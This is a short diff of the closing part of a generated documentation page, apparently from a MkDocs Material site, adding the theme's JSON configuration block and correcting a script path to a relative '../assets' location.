+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.action.edit", "content.action.view"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
